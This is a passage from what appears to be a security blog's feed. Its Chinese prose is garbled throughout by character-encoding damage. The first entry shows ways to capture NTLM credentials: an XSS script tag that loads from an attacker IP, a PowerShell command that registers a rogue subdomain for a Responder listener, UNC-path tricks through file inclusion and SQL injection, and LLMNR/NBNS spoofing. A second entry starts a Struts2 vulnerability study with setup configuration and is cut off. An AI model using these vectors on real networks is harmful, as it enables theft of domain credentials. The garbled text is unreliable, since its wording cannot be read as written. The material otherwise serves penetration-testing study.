Serviceï¼‰æ˜¯ä¸¤ç§ç½‘ç»œæœåŠ¡åè®®ï¼Œå®ƒä»¬ç”¨äºåœ¨å±€åŸŸç½‘ï¼ˆLANï¼‰ä¸­è§£æä¸»æœºååˆ°IPåœ°å€ã€‚</p></blockquote><ul><li><p>LLMNRæ˜¯å¾®è½¯å¼€å‘çš„ä¸€ä¸ªåŸºäºIPv6çš„åç§°è§£ææœåŠ¡ï¼Œç”¨äºåœ¨æ²¡æœ‰DNSæœåŠ¡å™¨çš„æƒ…å†µä¸‹è§£ææœ¬åœ°ç½‘ç»œä¸Šçš„ä¸»æœºåã€‚</p></li><li><p>å®ƒä½¿ç”¨IPv6çš„é“¾è·¯æœ¬åœ°åœ°å€ä½œä¸ºé€šä¿¡åª’ä»‹ï¼Œé€šè¿‡å‘é€å¤šæ’­æ¶ˆæ¯æ¥è§£æä¸»æœºåã€‚</p></li><li><p>LLMNRé€šå¸¸ç”¨äºå°å‹ç½‘ç»œæˆ–å®¶åº­ç½‘ç»œï¼Œå…¶ä¸­å¯èƒ½æ²¡æœ‰é…ç½®DNSæœåŠ¡å™¨ã€‚</p></li><li><p>NBNSæ˜¯NetBIOSï¼ˆNetwork Basic Input&#x2F;Output Systemï¼‰åç§°æœåŠ¡çš„ç¼©å†™ï¼Œæ˜¯æ—©æœŸWindowsç½‘ç»œä¸­ç”¨äºåç§°è§£æçš„ä¸€ä¸ªæœåŠ¡ã€‚</p></li><li><p>NBNSä½¿ç”¨NetBIOSåè®®ï¼Œé€šè¿‡å¹¿æ’­æˆ–å¤šæ’­æ¶ˆæ¯æ¥è§£æç½‘ç»œä¸Šçš„NetBIOSåç§°åˆ°IPåœ°å€ã€‚</p></li><li><p>NBNSä¸»è¦ç”¨äºåŸºäºNetBIOSçš„ç½‘ç»œï¼Œå¦‚Windows NTå’Œæ—©æœŸçš„Windowsç‰ˆæœ¬ã€‚</p></li></ul><p><strong>æ„é€ httpè·¯å¾„ï¼Œé€šè¿‡httpå‘æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯è¯·æ±‚</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">&lt;scripts src=<span class="hljs-string">&quot;//10.10.10.147/xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>åœ¨Microsoft Edgeç­‰æµè§ˆå™¨ä¸­å­˜åœ¨ä¿¡ä»»åŒºåŸŸ(Trusted Zones)ï¼Œå…¶ä¸­åŒ…æ‹¬äº’è”ç½‘(Internet)ã€æœ¬åœ°å†…éƒ¨ç½‘(Local Internet)ã€å—ä¿¡ä»»çš„ç«™ç‚¹(Trusted Sites)å’Œå—é™åˆ¶çš„ç«™ç‚¹(Restricted Sites)è¿™å‡ ä¸ªåŒºåŸŸ</p><p><img src="http://cdn.clown2024.cn/202407151446371.png" alt="image-20240528233328349"></p><p>æ¯ä¸ªåŒºåŸŸéƒ½å¯¹åº”ä¸åŒçš„å®‰å…¨ç­‰çº§ï¼Œå¹¶å…³è”ä¸åŒçš„é™åˆ¶æ¡ä»¶ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰å½“æŸç«™ç‚¹çš„åŸŸååœ¨æœ¬åœ°å†…éƒ¨ç½‘(Local Intranet)æˆ–å—ä¿¡ä»»çš„ç«™ç‚¹(Trusted Sites)åˆ—è¡¨ä¸­æ—¶ï¼Œæµè§ˆå™¨æ‰ä¼šè‡ªåŠ¨ä½¿ç”¨å½“å‰è®¡ç®—æœºå·²ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒNTLM è®¤è¯ï¼›å…¶ä½™æƒ…å†µéƒ½éœ€è¦ç”¨æˆ·æ‰‹åŠ¨è¾“å…¥èº«ä»½è¿›è¡ŒéªŒè¯ã€‚</p><p>é€šå¸¸ï¼Œè®¸å¤šç»„ç»‡å°†ä¼ä¸šå­åŸŸåæ‰€æ‰˜ç®¡çš„æ‰€æœ‰æ•°æ®æ ‡è®°ä¸ºå¯ä¿¡æ•°æ®ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151446372.png" alt="image-20240528233641528"></p><p>*.hack-my.com ä½äºç™½åå•ä¸­ï¼Œé‚£ä¹ˆæµ‹è¯•äººå‘˜åªéœ€è¦è·å–*.hack-my.com ä¸‹çš„æŸå°æœåŠ¡å™¨ä½¿ç”¨è¯¥æœåŠ¡å™¨å¯åŠ¨ Responder ç›‘å¬ï¼Œå°±å¯ä»¥è®©æµè§ˆå™¨è‡ªåŠ¨ä»¥ç™»å½•ç”¨æˆ·çš„å‡­æ®å‘èµ· NTLMè®¤è¯</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥Powermadé¡¹ç›®çš„Invoke-DNSUpdate.ps1è„šæœ¬å¯ç”¨æ¥å‘åŸŸå†…æ·»åŠ ä¸€æ¡æ–°çš„ DNS è®°å½•ï¼Œç”±äºåŸŸå†…çš„æˆå‘˜é»˜è®¤å…·æœ‰æ·»åŠ  DNS çš„æƒé™ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¯¥è„šæœ¬ä¸ºè¿è¡Œ Responder çš„æœåŠ¡å™¨æ³¨å†Œä¸€ä¸ªå­åŸŸåï¼Œå¦‚evil.hack-my.com</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Import-Module .ã€InvokeDNSUpdate.ps1<br>Invoke-DNSUpdate -DNSType A -DNSName evil.hack-my.com -DNSData 10.10.10.147<br></code></pre></td></tr></table></figure><p>ç„¶åxssæ”»å‡»å‘é‡ä¿®æ”¹æˆè¿™æ ·å³å¯æˆªè·NTLMè®¤è¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">&lt;scripts src=<span class="hljs-string">&quot;//evil.hack-my.com/xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3><span id="file-inclusion">File Inclusion</span></h3><p>åœ¨ Windows ä¸‹ï¼ŒPHP çš„å¸¸è§æ–‡ä»¶åŒ…å«æ–‡ä»¶è¯»å–ç±»å‡½æ•°ï¼Œå¯ä»¥è§£æ UNC ç½‘ç»œè·¯å¾„</p><p>å¦‚æœç½‘ç«™å­˜åœ¨ XXEã€SSRF ç­‰æ¼æ´ï¼Œéƒ½å¯ä»¥é€šè¿‡æŒ‡å®šç½‘ç»œè·¯å¾„(UNC æˆ– HTTP)ï¼Œå°è¯•è§¦å‘ NTLM è¯·æ±‚ã€‚</p><h3><span id="sqlæ³¨å…¥">SQLæ³¨å…¥</span></h3><p>åœ¨ Windows ä¸‹å®‰è£…çš„ MySQL æ•°æ®åº“ä¸­ï¼Œload_fileã€into dumpfileç­‰å¸¸è§æ“ä½œå‡æ”¯æŒUNC è·¯å¾„</p><p><img src="http://cdn.clown2024.cn/202407151446373.png" alt="image-20240528234420733"></p><p>mysqlçš„å‰ææ˜¯è¦æ‹¥æœ‰ç›¸å…³æ“ä½œçš„æƒé™ï¼Œå¹¶ä¸”æ²¡æœ‰secure_file_privçš„é™åˆ¶</p><p>å¯¹åº”SQL Serveræ•°æ®åº“ï¼Œé€šè¿‡è°ƒç”¨xp_dirtreeç­‰å­˜å‚¨è¿‡ç¨‹å¯ä»¥å‘èµ·NTLMè¯·æ±‚ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151446374.png" alt="image-20240528234602866"></p><h2><span id="llmnrx2fnbnsæ¬ºéª—åˆ©ç”¨">LLMNR&#x2F;NBNSæ¬ºéª—åˆ©ç”¨</span></h2><p>LLMNR(Link-Local Multicast Name Resolution,é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æ)æ˜¯ä¸€ä¸ªåŸºäºåè®®çš„åŸŸåç³»ç»Ÿ(DNS)æ•°æ®åŒ…çš„æ ¼å¼ï¼ŒIPv4å’ŒIPv6çš„ä¸»æœºå¯ä»¥é€šè¿‡æ­¤åè®®å¯¹åŒä¸€æœ¬åœ°é“¾è·¯ä¸Šçš„ä¸»æœºæ‰§è¡Œåç§°è§£æã€‚</p><p>NBNS çš„å…¨ç§°ä¸º NetBIOS Name Serviceï¼Œç”¨äºåœ¨åŸºäº NetBIOS åç§°è®¿é—®çš„ç½‘ç»œä¸Šæä¾›ä¸»æœºåå’Œåœ°å€æ˜ å°„æ–¹æ³•ã€‚å‡ ä¹æ‰€æœ‰å±€åŸŸç½‘éƒ½æ˜¯åœ¨NetBIOSåè®®çš„åŸºç¡€ä¸Šå·¥ä½œçš„ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥åˆ©ç”¨ WINS æœåŠ¡ã€å¹¿æ’­å’Œ Lmhost æ–‡ä»¶ç­‰ï¼Œä»¥å°†NetBIOSåç§°è§£æåˆ°ç›¸åº”çš„IP åœ°å€ã€‚</p><p>å½“ä¸€å°ä¸»æœºè¦è®¿é—®å¦ä¸€å°ä¸»æœºæ—¶ï¼Œä¼šå…ˆåœ¨è‡ªå·±æœ¬åœ°åç§°ç¼“å­˜ä¸­æŸ¥è¯¢ç›®æ ‡ä¸»æœºçš„åç§°ã€‚å¦‚æœåœ¨æœ¬åœ°ç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„åç§°ï¼Œé‚£ä¹ˆä¸»æœºä¼šå‘ DNS æœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚å¦‚æœä¸»æœºæ²¡æœ‰æ”¶åˆ°å“åº”æˆ–æ”¶åˆ°äº†é”™è¯¯çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆä¸»æœºä¼šä½¿ç”¨ LLMNR æˆ– NBNS åˆ†åˆ«å‘å±€åŸŸç½‘å†…å‘é€ UDP å¤šæ’­æˆ–å¹¿æ’­è¯·æ±‚ï¼Œä»¥æŸ¥è¯¢å¯¹åº”çš„ä¸»æœºåã€‚å±€åŸŸç½‘çš„å…¶ä»–ä¸»æœºåœ¨æ”¶åˆ°è¿™ä¸ªæŸ¥è¯¢è¯·æ±‚åï¼Œä¼šå°†è¢«æŸ¥è¯¢çš„åç§°ä¸è‡ªå·±çš„ä¸»æœºåè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœä¸è‡ªå·±çš„ä¸»æœºåä¸€è‡´ï¼Œå°±å›å¤ä¸€æ¡åŒ…å«äº†è‡ªå·± IP åœ°å€çš„å•æ’­å“åº”ç»™å‘å‡ºè¯¥æŸ»è¯¢è¯·æ±‚çš„ä¸»æœºï¼Œå¦åˆ™ä¸¢å¼ƒä¹‹ã€‚</p><p>é‚£ä¹ˆæµ‹è¯•äººå‘˜å°±å¯ä»¥åœ¨è¯¥è¿‡ç¨‹ä¸­ä½¿ç”¨ä¸­é—´äººæ”»å‡»ï¼Œå½“åˆæ³•ä¸»æœºè¾“å…¥ä¸å­˜åœ¨æˆ–è€…é”™è¯¯çš„ä¸»æœºåï¼Œæµ‹è¯•äººå‘˜å°±å¯ä»¥ä»£æ›¿è¿™ä¸ªä¸»æœºè¿›è¡Œå›å¤ï¼Œå¹¶é€šè¿‡Responderç­‰å·¥å…·è¦æ±‚å—å®³æœºå™¨å‘èµ·NTLMèº«ä»½éªŒè¯ã€‚</p><h1><span id="ä¸­ç»§åˆ°smbåˆ©ç”¨">ä¸­ç»§åˆ°SMBåˆ©ç”¨</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ntlmåè®®&quot;&gt;NTLMåè®®&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;NTLM(NT LAN Manager)æ˜¯ä¸€å¥— Windows å®‰å…¨åè®®ï¼Œæ—¨åœ¨ä¸ºç”¨æˆ·æä¾›å…·æœ‰å®Œæ•´æ€§å’Œæœºå¯†æ€§çš„èº«ä»½éªŒè¯ã€‚&lt;/p&gt;
&lt;p&gt;NTLM æ˜¯åŸºäºè´¨è¯¢&amp;#x2F;åº”ç­”æ¨¡å¼çš„èº«ä»½éªŒè¯åè®®ï¼Œå…¶è¿‡</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Struts2æ¼æ´å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-05-10T08:40:37.000Z</published>
    <updated>2024-07-15T06:44:39.834Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="struts2ä»‹ç»">Struts2ä»‹ç»</span></h1><p>Struts2æ˜¯ä»¥MVCæ¶æ„ä¸ºåŸºç¡€çš„WEBæ¡†æ¶ï¼Œé€šè¿‡WEB Filterçš„æ–¹å¼å†…åµŒåœ¨WEBæœåŠ¡å™¨ä¸­è¿›è¡Œä½¿ç”¨ï¼Œä»–å¯¹servletè¿›è¡Œäº†å°è£…ã€‚</p><p>Struts2ä¸Struts1å…³ç³»ï¼šStruts2æ˜¯Strutsçš„ä¸‹ä¸€ä»£äº§å“ï¼Œæ˜¯åœ¨Struts1å’ŒWebWorkçš„æŠ€æœ¯åŸºç¡€ä¸Šè¿›è¡Œäº†åˆå¹¶çš„å…¨æ–°çš„Struts2æ¡†æ¶<br>å…¶å…¨æ–°çš„Struts2çš„ä½“ç³»ç»“æ„ä¸Struts1çš„ä½“ç³»ç»“æ„å·®åˆ«å·¨å¤§ã€‚</p><p>Struts2ä»¥WebWorkä¸ºæ ¸å¿ƒ</p><p>Struts2&#x3D;Struts1+WebWork</p><p>Struts2æ˜¯Apacheçš„äº§å“ã€‚</p><p>Struts2æ˜¯ä¸€ä¸ªæ ‡å‡†çš„MVCæ¡†æ¶ã€‚JAVAWEBä¸­çš„model2æ¨¡å¼å°±æ˜¯ä¸€ä¸ªMVCæ¨¡å¼ã€‚model2&#x3D;Servlet+jsp+JavaBean</p><p>Struts2æ¡†æ¶æ˜¯åœ¨JAVAWEBå¼€å‘ä¸­ä½¿ç”¨çš„ã€‚<br>ä½¿ç”¨Struts2æ¡†æ¶ï¼Œå¯ä»¥ç®€åŒ–æˆ‘ä»¬çš„webå¼€å‘ï¼Œå¹¶ä¸”é™ä½ç¨‹åºçš„è€¦åˆåº¦ã€‚</p><p>ç±»ä¼¼äºStruts2æ¡†æ¶çš„äº§å“ï¼šStruts1ã€webworkã€jsfï¼ˆSunæä¾›ï¼‰ã€SpringMVCéƒ½æ˜¯MVCæ¨¡å¼</p><h1><span id="struts2ç¯å¢ƒé…ç½®">Struts2ç¯å¢ƒé…ç½®</span></h1><p>è¿™é‡Œé‡‡ç”¨mavenæ·»åŠ ä¾èµ–çš„æ–¹å¼é…ç½®</p><p>è¿™é‡Œé€‰äº†ä¸€ä¸ªæœ€ä½ç‰ˆæœ¬çš„æ–¹ä¾¿æ¼æ´æµ‹è¯•</p><p><img src="http://cdn.clown2024.cn/202407151444306.png" alt="image-20240510165534126"></p><p>å¯ä»¥å®‰è£…ä¸€ä¸ªstruts2æ’ä»¶æ–¹ä¾¿é«˜äº®æ˜¾ç¤º</p><p><img src="http://cdn.clown2024.cn/202407151444307.png" alt="image-20240510165817113"></p><p>é…ç½®web.xmlçš„è¿‡æ»¤å™¨å’Œæ˜ å°„,é…ç½®å¯ä»¥å‚è€ƒå®˜ç½‘ï¼š<a href="https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application#our-first-application%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8%E5%8F%AF%E8%83%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84%E6%A1%86%E6%9E%B6%E4%B8%8D%E4%B8%80%E6%A0%B7%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E9%80%89%E6%8B%A9%EF%BC%8C%E8%BF%98%E5%8F%AF%E4%BB%A5%E4%BB%8E%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E7%BB%99%E7%9A%84%E7%A4%BA%E4%BE%8Bwar%E5%8C%85%E4%B8%AD%E7%9A%84WEB-INF%E4%B8%8B%E7%9A%84web.xml%E6%9D%A5%E5%8F%82%E8%80%83">https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application#our-first-applicationï¼Œä¸è¿‡è¿‡æ»¤å™¨å¯èƒ½ä¸åŒç‰ˆæœ¬çš„æ¡†æ¶ä¸ä¸€æ ·éœ€è¦è‡ªå·±é€‰æ‹©ï¼Œè¿˜å¯ä»¥ä»é¡¹ç›®æºç ç»™çš„ç¤ºä¾‹waråŒ…ä¸­çš„WEB-INFä¸‹çš„web.xmlæ¥å‚è€ƒ</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Basic Struts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444308.png" alt="image-20240510190214572"></p><p>è§£é‡Šä¸€ä¸‹å„æ ‡ç­¾çš„å«ä¹‰ï¼Œé…å¾—æ¯”è¾ƒå°‘é¡ºä¾¿è®°å½•ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;display-name&gt;ï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰çš„æ ‡ç­¾ï¼Œç”¨äºä¸º Web åº”ç”¨æä¾›ä¸€ä¸ªæ˜¾ç¤ºåç§°ã€‚è¿™ä¸ªåç§°é€šå¸¸åœ¨éƒ¨ç½²æ—¶æˆ–é€šè¿‡åº”ç”¨æœåŠ¡å™¨çš„ç®¡ç†ç•Œé¢å±•ç¤ºã€‚<br>&lt;filter&gt;ï¼šå®šä¹‰ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå®ƒæ˜¯ Java Servlet è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºæ‹¦æˆªè¿›å…¥ Servlet å®¹å™¨çš„è¯·æ±‚å’Œå“åº”ã€‚<br><br>&lt;filter-name&gt;ï¼šä¸ºè¿‡æ»¤å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼Œè¿™é‡Œåç§°ä¸º struts2ã€‚è¿™ä¸ªåç§°åœ¨æ•´ä¸ªåº”ç”¨ä¸­åº”è¯¥æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”åœ¨åé¢å®šä¹‰ &lt;filter-mapping&gt; æ—¶ä¼šè¢«å¼•ç”¨ã€‚<br>&lt;filter-class&gt;ï¼šæŒ‡å®šè¿‡æ»¤å™¨çš„å®Œæ•´ç±»åã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œorg.apache.struts2.dispatcher.FilterDispatcher æ˜¯ Struts2 æ¡†æ¶çš„æ ¸å¿ƒè¿‡æ»¤å™¨ç±»ï¼Œå®ƒè´Ÿè´£æ‹¦æˆªè¯·æ±‚å¹¶åˆ†æ´¾ç»™ç›¸åº”çš„ Action å¯¹è±¡å¤„ç†ã€‚<br><br>&lt;filter-mapping&gt;ï¼šå®šä¹‰å¦‚ä½•å°†è¿‡æ»¤å™¨æ˜ å°„åˆ° Servlet å®¹å™¨ä¸­çš„ URL è¯·æ±‚ä¸Šã€‚<br><br>&lt;filter-name&gt;ï¼šæŒ‡å®šä¸Šé¢å®šä¹‰çš„è¿‡æ»¤å™¨çš„åç§°ï¼Œè¿™é‡Œå¼•ç”¨äº† struts2 è¿‡æ»¤å™¨ã€‚<br>&lt;url-pattern&gt;ï¼šå®šä¹‰è¿‡æ»¤å™¨å°†è¢«åº”ç”¨äºå“ªäº› URL è¯·æ±‚ã€‚/* æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œè¡¨ç¤ºæ‰€æœ‰çš„ URL è¯·æ±‚éƒ½å°†è¢« struts2 è¿‡æ»¤å™¨å¤„ç†ã€‚<br><br>&lt;welcome-file-list&gt;ï¼šå®šä¹‰åº”ç”¨çš„æ¬¢è¿æ–‡ä»¶ï¼Œå½“ç”¨æˆ·è®¿é—®åº”ç”¨çš„æ ¹ç›®å½•è€Œæ²¡æœ‰æŒ‡å®šå…·ä½“é¡µé¢æ—¶ï¼ŒServlet å®¹å™¨å°†æä¾›è¿™äº›æ–‡ä»¶ã€‚<br><br>&lt;welcome-file&gt;ï¼šæŒ‡å®šæ¬¢è¿æ–‡ä»¶çš„åç§°ï¼Œè¿™é‡Œä¸º index.jspã€‚è¿™æ„å‘³ç€å½“ç”¨æˆ·è®¿é—®åº”ç”¨çš„æ ¹ URL æ—¶ï¼Œå¦‚ http://localhost:8080/YourApp/ï¼ŒServlet å®¹å™¨å°†è‡ªåŠ¨æä¾› index.jsp é¡µé¢ã€‚<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è‡ªå·±æ·»åŠ ä¸€ä¸ªstruts2.xmlç”¨æ¥æŒ‡å®š URLã€Java ç±»å’Œè§†å›¾é¡µé¢ï¼ˆä¾‹å¦‚<code>index.jsp</code>ï¼‰ä¹‹é—´çš„å…³ç³»ï¼Œè¿™é‡Œä¹Ÿå‚è€ƒä¸Šé¢å®˜ç½‘çš„é…ç½®ï¼Œæ–‡ä»¶è·¯å¾„ä¸º<code>src/main/resources</code>ï¼Œdtdæ–‡ä»¶çš„ç‰ˆæœ¬ä¹Ÿè¦å’Œè‡ªå·±çš„æ¡†æ¶ç‰ˆæœ¬å¯¹åº”</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">struts</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devMode&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br>    <span class="hljs-comment">&lt;!--æ‰€æœ‰çš„actionè¦æ”¾åœ¨packagesä¸­ï¼Œä¸”è¦ç»§æ‰¿struts-defaultåŒ…ï¼Œå› ä¸ºé‡Œé¢æ˜¯è¯¥æ¡†æ¶å°è£…çš„ä¸œè¥¿--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicstruts2&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--nameå¯¹åº”çš„æ˜¯è¯·æ±‚åœ°å€ï¼Œclassæ˜¯è¯·æ±‚å¤„ç†çš„ç±»--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--resultçš„nameæ˜¯Actionç±»ä¸­è¿”å›çš„å­—ç¬¦ä¸²ï¼Œå¯¹åº”ä¸åŒç›¸åº”åˆ°ä¸åŒé¡µé¢--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;action.HelloWorldAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/HelloWorld.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444309.png" alt="image-20240510191813662"></p><p><code>struts.xml</code> æ–‡ä»¶çš„ä¸»è¦ä½œç”¨åŒ…æ‹¬ï¼š</p><ol><li><strong>å®šä¹‰åŒ…ï¼ˆPackagesï¼‰</strong>ï¼šStruts 2 å…è®¸é€šè¿‡åŒ…çš„æ¦‚å¿µæ¥ç»„ç»‡å’Œéš”ç¦»ä¸åŒçš„ Action å’Œç»“æœç±»å‹ã€‚æ¯ä¸ªåŒ…å¯ä»¥æœ‰è‡ªå·±çš„å‘½åç©ºé—´ï¼Œå¹¶ä¸”å¯ä»¥é‡ç”¨å…¶ä»–åŒ…ä¸­å®šä¹‰çš„ç±»ã€‚</li><li><strong>é…ç½® Action</strong>ï¼šåœ¨ <code>struts.xml</code> ä¸­ï¼Œä½ å¯ä»¥å®šä¹‰ Actionï¼ŒåŒ…æ‹¬ Action çš„ç±»ã€æ–¹æ³•ä»¥åŠå®ƒä»¬æ˜ å°„åˆ°çš„è¯·æ±‚ URLã€‚Action æ˜ å°„å¯ä»¥æ˜¯ç®€å•çš„è·¯å¾„æ˜ å°„ï¼Œä¹Ÿå¯ä»¥æ˜¯æ›´å¤æ‚çš„å‚æ•°æ˜ å°„ã€‚</li><li><strong>ç»“æœï¼ˆResultï¼‰æ˜ å°„</strong>ï¼šä¸ºæ¯ä¸ª Action å®šä¹‰å¯èƒ½çš„ç»“æœæ˜ å°„ã€‚ç»“æœå¯ä»¥æ˜¯è½¬å‘åˆ°å¦ä¸€ä¸ªé¡µé¢ã€é‡å®šå‘åˆ°å¦ä¸€ä¸ª URLï¼Œæˆ–è€…æ˜¯è‡ªç”±æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚</li><li><strong>æ‹¦æˆªå™¨ï¼ˆInterceptorsï¼‰é…ç½®</strong>ï¼šStruts 2 ä½¿ç”¨æ‹¦æˆªå™¨æ¥å¤„ç†å¦‚èº«ä»½éªŒè¯ã€æ—¥å¿—è®°å½•ã€äº‹åŠ¡ç®¡ç†ç­‰æ¨ªåˆ‡å…³æ³¨ç‚¹ã€‚åœ¨ <code>struts.xml</code> ä¸­ï¼Œå¯ä»¥å®šä¹‰æ‹¦æˆªå™¨æ ˆï¼ˆInterceptor Stacksï¼‰å’Œç‰¹å®šçš„æ‹¦æˆªå™¨ã€‚</li><li><strong>å¼‚å¸¸å¤„ç†</strong>ï¼šå®šä¹‰å…¨å±€å’Œæ“ä½œçº§åˆ«çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œå…è®¸ä½ æ•è·å’Œå¤„ç†åº”ç”¨ç¨‹åºä¸­çš„å¼‚å¸¸ã€‚</li><li><strong>ç±»å‹è½¬æ¢</strong>ï¼šé…ç½®å¦‚ä½•å°† HTTP è¯·æ±‚å‚æ•°è½¬æ¢ä¸º Action å±æ€§çš„ç±»å‹ã€‚</li><li><strong>åŒ…å«å…¶ä»–é…ç½®æ–‡ä»¶</strong>ï¼šå¯ä»¥ä½¿ç”¨ <code>&lt;include&gt;</code> æ 